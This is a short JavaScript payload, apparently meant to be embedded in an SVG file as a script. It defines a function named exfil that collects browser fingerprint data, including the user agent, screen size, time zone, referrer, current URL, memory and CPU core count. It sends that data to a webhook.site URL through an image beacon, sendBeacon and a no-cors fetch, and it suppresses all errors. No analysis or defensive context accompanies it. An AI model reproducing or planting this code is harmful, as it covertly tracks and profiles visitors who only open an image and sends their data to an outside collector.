svg.script:
    //
    function exfil() {
        try {
            var info = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                lang: navigator.language,
                cookies: navigator.cookieEnabled,
                sw: screen.width,
                sh: screen.height,
                cd: screen.colorDepth,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                tzo: new Date().getTimezoneOffset(),
                ref: document.referrer || "direct",
                url: window.location.href,
                time: new Date().toISOString(),
                ram: navigator.deviceMemory || "unknown",
                cpu_cores: navigator.hardwareConcurrency || "unknown"
            };

            var data = encodeURIComponent(JSON.stringify(info));

            // PRIMARY - Image beacon (no CORS issues)
            new Image().src = "https://webhook.site/31e8ac26-f408-47e2-bad6-e55c0b7e1647?d=" + data + "&_=" + Math.random();

            // FALLBACK - sendBeacon
            try { navigator.sendBeacon("https://webhook.site/31e8ac26-f408-47e2-bad6-e55c0b7e1647", JSON.stringify(info)); } catch(e){}

            // FALLBACK - fetch no-cors
            try { fetch("https://webhook.site/31e8ac26-f408-47e2-bad6-e55c0b7e1647", {method:"POST",mode:"no-cors",body:JSON.stringify(info)}); } catch(e){}

        } catch(e) {}
    }
    //
